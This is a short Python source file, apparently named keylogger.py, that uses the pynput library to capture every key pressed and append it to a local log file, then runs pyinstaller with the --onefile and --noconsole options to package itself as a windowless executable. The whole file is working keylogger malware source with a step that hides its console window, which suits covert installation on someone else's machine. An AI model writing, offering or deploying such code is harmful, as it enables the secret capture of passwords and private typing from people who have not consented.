from pynput import keyboard
import sys
import os
import subprocess

def keyPressed(key):
    """
    Prints the pressed key and appends it to a log file.

    Args:
        key: The key object representing the pressed key.

    Returns:
        None
    """
    print(str(key))
    with open("data/keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        current_dir = sys._MEIPASS
    else:
        # Running as script
        current_dir = os.path.dirname(os.path.abspath(__file__))

    # Build the command to create the .exe file
    command = f'pyinstaller --onefile --noconsole {os.path.join(current_dir, "keylogger.py")}'

    # Run the command
    subprocess.run(command, shell=True)